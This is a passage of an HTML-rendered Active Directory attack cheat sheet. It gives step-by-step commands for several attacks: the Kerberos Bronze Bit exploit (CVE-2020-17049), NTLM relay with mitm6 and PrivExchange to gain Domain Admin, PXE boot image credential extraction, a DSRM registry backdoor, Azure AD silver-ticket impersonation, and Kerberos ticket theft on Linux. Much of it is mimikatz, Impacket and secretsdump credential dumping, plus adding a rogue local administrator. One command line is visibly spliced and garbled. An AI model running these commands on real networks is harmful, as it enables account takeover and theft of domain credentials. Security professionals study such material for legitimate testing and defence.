<h3 id="kerberos-bronze-bit-attack---cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</h3>

<blockquote>
  <p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the <strong>Protected Users</strong> group and any other users explicitly configured as <strong>sensitive and cannot be delegated</strong>.</p>
</blockquote>

<blockquote>
  <p>Patch is out on November 10, 2020, DC are most likely vulnerable until <a href="https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049">February 2021</a>.</p>
</blockquote>

<p>:warning: Patched Error Message : <code class="language-plaintext highlighter-rouge">[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p>

<p>Requirements:</p>
<ul>
  <li>Service account’s password hash</li>
  <li>Service account’s with <code class="language-plaintext highlighter-rouge">Constrained Delegation</code> or <code class="language-plaintext highlighter-rouge">Resource Based Constrained Delegation</code></li>
  <li><a href="https://github.com/SecureAuthCorp/impacket/pull/1013">Impacket PR #1013</a></li>
</ul>

<p><strong>Attack #1</strong> - Bypass the <code class="language-plaintext highlighter-rouge">Trust this user for delegation to specified services only – Use Kerberos only</code> protection and impersonate a user who is protected from delegation.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># forwardable flag is only protected by the ticket encryption which uses the service account's password </span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">getST.py</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">cifs/Service2.test.local</span><span class="w"> </span><span class="nt">-impersonate</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">LM:NTLM</span><span class="w"> </span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-aesKey</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">AES</span><span class="w"> </span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">test.local/Service1</span><span class="w"> </span><span class="nt">-force-forwardable</span><span class="w"> </span><span class="nt">-dc-ip</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">controller</span><span class="err">&gt;</span><span class="w"> </span><span class="c"># -&gt; Forwardable</span><span class="w">

</span><span class="err">$</span><span class="w"> </span><span class="n">getST.py</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">cifs/Service2.test.local</span><span class="w"> </span><span class="nt">-impersonate</span><span class="w"> </span><span class="nx">User2</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="nx">aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f</span><span class="w"> </span><span class="nt">-aesKey</span><span class="w"> </span><span class="nx">4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4</span><span class="w"> </span><span class="nx">test.local/Service1</span><span class="w"> </span><span class="nt">-force-forwardable</span><span class="w">

</span><span class="c"># Load the ticket</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz\mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::ptc User2.ccache"</span><span class="w"> </span><span class="nx">exit</span><span class="w">

</span><span class="c"># Access "c$"</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\service2.test.local\c</span><span class="err">$</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><strong>Attack #2</strong> - Write Permissions to one or more objects in the AD</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c"># Create a new machine account</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Powermad\powermad.ps1</span><span class="w">
</span><span class="n">New-MachineAccount</span><span class="w"> </span><span class="nt">-MachineAccount</span><span class="w"> </span><span class="nx">AttackerService</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'AttackerServicePassword'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz\mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local"</span><span class="w"> </span><span class="nx">exit</span><span class="w">

</span><span class="c"># Set PrincipalsAllowedToDelegateToAccount</span><span class="w">
</span><span class="n">Install-WindowsFeature</span><span class="w"> </span><span class="nx">RSAT-AD-PowerShell</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w">
</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nx">AttackerService</span><span class="w">
</span><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nx">Service2</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nx">AttackerService</span><span class="err">$</span><span class="w">
</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nx">Service2</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">PrincipalsAllowedToDelegateToAccount</span><span class="w">

</span><span class="c"># Execute the attack</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="o">.</span><span class="nx">\impacket\examples\getST.py</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nx">cifs/Service2.test.local</span><span class="w"> </span><span class="nt">-impersonate</span><span class="w"> </span><span class="nx">User2</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="nx">830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5</span><span class="w"> </span><span class="nt">-aesKey</span><span class="w"> </span><span class="nx">2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc</span><span class="w"> </span><span class="nx">test.local/AttackerService</span><span class="w"> </span><span class="nt">-force-forwardableet-ADComputer</span><span class="w"> </span><span class="nx">Service2</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nx">AttackerService</span><span class="err">$</span><span class="w">

</span><span class="c"># Load the ticket</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz\mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::ptc User2.ccache"</span><span class="w"> </span><span class="nx">exit</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="relay-delegation-with-mitm6">Relay delegation with mitm6</h3>

<p>Prerequisites:</p>
<ul>
  <li>IPv6 enabled (Windows prefers IPV6 over IPv4)</li>
  <li>LDAP over TLS (LDAPS)</li>
</ul>

<blockquote>
  <p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account’s name and password and modifies the delegation rights of it.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/fox-it/mitm6.git</span><span class="w"> 
</span><span class="n">cd</span><span class="w"> </span><span class="nx">/opt/tools/mitm6</span><span class="w">
</span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="o">.</span><span class="w">

</span><span class="n">mitm6</span><span class="w"> </span><span class="nt">-hw</span><span class="w"> </span><span class="nx">ws02</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">lab.local</span><span class="w"> </span><span class="nt">--ignore-nofqnd</span><span class="w">
</span><span class="n">ntlmrelayx.py</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ldaps://dc01.lab.local</span><span class="w"> </span><span class="nt">--delegate-access</span><span class="w"> </span><span class="nt">--no-smb-server</span><span class="w"> </span><span class="nt">-wh</span><span class="w"> </span><span class="nx">attacker-wpad</span><span class="w">
</span><span class="n">then</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">rubeus</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">relay</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">delegation</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="privexchange-attack">PrivExchange attack</h3>

<p>Exchange your privileges for Domain Admin privs by abusing Exchange.  <br />
:warning: You need a shell on a user account with a mailbox.</p>

<ol>
  <li>
    <p>Exchange server hostname or IP address</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> pth-net rpc group members <span class="s2">"Exchange Servers"</span> <span class="nt">-I</span> dc01.domain.local <span class="nt">-U</span> domain/username
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">ntlmrelayx.py</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ldap://dc01.domain.local</span><span class="w"> </span><span class="nt">--escalate-user</span><span class="w"> </span><span class="nx">username</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server’s to send back its NTLMv2 hash to a controlled machine.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre> <span class="c"># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py</span>
 python privexchange.py <span class="nt">-ah</span> xxxxxxx <span class="nt">-u</span> xxxx <span class="nt">-d</span> xxxxx
 python privexchange.py <span class="nt">-ah</span> 10.0.0.2 mail01.domain.local <span class="nt">-d</span> domain.local <span class="nt">-u</span> user_exchange <span class="nt">-p</span> pass_exchange
    
 <span class="c"># https://github.com/G0ldenGunSec/PowerPriv </span>
 powerPriv <span class="nt">-targetHost</span> corpExch01 <span class="nt">-attackerHost</span> 192.168.1.17 <span class="nt">-Version</span> 2016
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user’s NTLM hash</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> python secretsdump.py xxxxxxxxxx <span class="nt">-just-dc</span>
 python secretsdump.py lab/buff@192.168.0.2 <span class="nt">-ntds</span> ntds <span class="nt">-history</span> <span class="nt">-just-dc-ntlm</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Clean your mess and restore a previous state of the user’s ACL</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">aclpwn.py</span><span class="w"> </span><span class="nt">--restore</span><span class="w"> </span><span class="o">..</span><span class="nx">/aclpwn-20190319-125741.restore</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<p>Alternatively you can use the Metasploit module</p>

<p><a href="https://github.com/rapid7/metasploit-framework/pull/11420"><code class="language-plaintext highlighter-rouge">use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></a></p>

<p>Alternatively you can use an all-in-one tool : Exchange2domain.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">github.com/Ridter/Exchange2domain</span><span class="w"> 
</span><span class="n">python</span><span class="w"> </span><span class="nx">Exchange2domain.py</span><span class="w"> </span><span class="nt">-ah</span><span class="w"> </span><span class="nx">attackterip</span><span class="w"> </span><span class="nt">-ap</span><span class="w"> </span><span class="nx">listenport</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.com</span><span class="w"> </span><span class="nt">-th</span><span class="w"> </span><span class="nx">DCip</span><span class="w"> </span><span class="nx">MailServerip</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">Exchange2domain.py</span><span class="w"> </span><span class="nt">-ah</span><span class="w"> </span><span class="nx">attackterip</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.com</span><span class="w"> </span><span class="nt">-th</span><span class="w"> </span><span class="nx">DCip</span><span class="w"> </span><span class="nt">--just-dc-user</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w"> </span><span class="nx">MailServerip</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="pxe-boot-image-attack">PXE Boot image attack</h3>

<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p>

<ul>
  <li>Press <strong>[F8]</strong> during the PXE boot to spawn an administrator console on the deployed machine.</li>
  <li>
    <p>Press <strong>[SHIFT+F10]</strong> during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="nx">Password123</span><span class="o">!</span><span class="w"> </span><span class="nx">/add</span><span class="w">
  </span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">hacker</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Extract the pre-boot image (wim files) using <a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)</a> and dig through it to find default passwords and domain accounts.</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># Import the module</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerPXE.ps1</span><span class="w">

  </span><span class="c"># Start the exploit on the Ethernet interface</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-PXEcreds</span><span class="w"> </span><span class="nt">-InterfaceAlias</span><span class="w"> </span><span class="nx">Ethernet</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-PXECreds</span><span class="w"> </span><span class="nt">-InterfaceAlias</span><span class="w"> </span><span class="err">«</span><span class="w"> </span><span class="nx">lab</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="err">»</span><span class="w"> 

  </span><span class="c"># Wait for the DHCP to get an address</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">DHCP</span><span class="w"> </span><span class="nx">proposal</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address:</span><span class="w"> </span><span class="nx">192.168.22.101</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">DHCP</span><span class="w"> </span><span class="nx">Validation:</span><span class="w"> </span><span class="nx">DHCPACK</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">configured:</span><span class="w"> </span><span class="nx">192.168.22.101</span><span class="w">

  </span><span class="c"># Extract BCD path from the DHCP response</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Request</span><span class="w"> </span><span class="nx">BCD</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">path</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">BCD</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">path:</span><span class="w">  </span><span class="nx">\Tmp\x86x64</span><span class="p">{</span><span class="mi">5</span><span class="n">AF4E332-C90A-4015-9BA2-F8A7C9FF04E6</span><span class="p">}</span><span class="o">.</span><span class="nf">bcd</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">TFTP</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">Address:</span><span class="w">  </span><span class="nx">192.168.22.3</span><span class="w">

  </span><span class="c"># Download the BCD file and extract wim files</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Launch</span><span class="w"> </span><span class="nx">TFTP</span><span class="w"> </span><span class="nx">download</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="nx">succeeded.</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Parse</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">BCD</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">conf.bcd</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">Identify</span><span class="w"> </span><span class="nx">wim</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">\Boot\x86\Images\LiteTouchPE_x86.wim</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">Identify</span><span class="w"> </span><span class="nx">wim</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">\Boot\x64\Images\LiteTouchPE_x64.wim</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Launch</span><span class="w"> </span><span class="nx">TFTP</span><span class="w"> </span><span class="nx">download</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="nx">succeeded.</span><span class="w">

  </span><span class="c"># Parse wim files to find interesting data</span><span class="w">
  </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="nx">LiteTouchPE_x86.wim</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">Finding</span><span class="w"> </span><span class="nx">Bootstrap.ini</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">DeployRoot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">\\LAB-MDT\DeploymentShare</span><span class="err">$</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="n">UserID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MdtService</span><span class="w">
  </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="err">&gt;&gt;&gt;&gt;</span><span class="w"> </span><span class="nx">UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Somepass1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="dsrm-credentials">DSRM Credentials</h3>

<blockquote>
  <p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.</p>
</blockquote>

<p>This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.</p>

<pre><code class="language-ps1">Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# Change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
</code></pre>

<h3 id="impersonating-office-365-users-on-azure-ad-connect">Impersonating Office 365 Users on Azure AD Connect</h3>

<p>Prerequisites:</p>

<ul>
  <li>Obtain NTLM password hash of the AZUREADSSOACC account
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">mimikatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:AZUREADSSOACC$"</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>AAD logon name of the user we want to impersonate (userPrincipalName or mail)
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">elrond</span><span class="err">@</span><span class="nx">contoso.com</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>SID of the user we want to impersonate
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">S-1-5-21-2121516926-2695913149-3163778339-1234</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<p>Create the Silver Ticket and inject it into Kerberos cache:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:elrond
/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
/target:aadg.windows.net.nsatc.net /service:HTTP /ptt"</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Launch Mozilla Firefox, go to about:config</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">network.negotiate-auth.trusted-uris</span><span class="o">=</span><span class="s2">"https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com"</span><span class="o">.</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.</p>

<h2 id="linux-active-directory">Linux Active Directory</h2>

<h3 id="ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</h3>

<p>List the current ticket used for authentication with <code class="language-plaintext highlighter-rouge">env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/tmp/ticket.ccache</code></p>

<blockquote>
  <p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</p>
</blockquote>

<h3 id="ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</h3>

<p>Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="n">root</span><span class="err">@</span><span class="n">Lab</span><span class="nt">-LSV01</span><span class="w"> </span><span class="n">/</span><span class="p">]</span><span class="c"># /tmp/tickey -i</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">krb5</span><span class="w"> </span><span class="n">ccache_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KEYRING</span><span class="p">:</span><span class="n">session</span><span class="p">:</span><span class="n">sess_</span><span class="o">%</span><span class="p">{</span><span class="n">uid</span><span class="p">}</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="nx">detected</span><span class="p">,</span><span class="w"> </span><span class="nx">so...</span><span class="w"> </span><span class="nx">DUMP</span><span class="w"> </span><span class="nx">ALL</span><span class="w"> </span><span class="nx">THE</span><span class="w"> </span><span class="nx">TICKETS</span><span class="o">!!</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Trying</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">inject</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">tarlogic</span><span class="p">[</span><span class="mi">1000</span><span class="p">]</span><span class="w"> </span><span class="nx">session...</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Successful</span><span class="w"> </span><span class="nx">injection</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">25723</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">tarlogic</span><span class="p">[</span><span class="mi">1000</span><span class="p">],</span><span class="nx">look</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">tickets</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">/tmp/__krb_1000.ccache</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Trying</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">inject</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">velociraptor</span><span class="p">[</span><span class="mi">1120601115</span><span class="p">]</span><span class="w"> </span><span class="nx">session...</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Successful</span><span class="w"> </span><span class="nx">injection</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">25794</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">velociraptor</span><span class="p">[</span><span class="mi">1120601115</span><span class="p">],</span><span class="nx">look</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">tickets</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">/tmp/__krb_1120601115.ccache</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Trying</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">inject</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">trex</span><span class="p">[</span><span class="mi">1120601113</span><span class="p">]</span><span class="w"> </span><span class="nx">session...</span><span class="w">
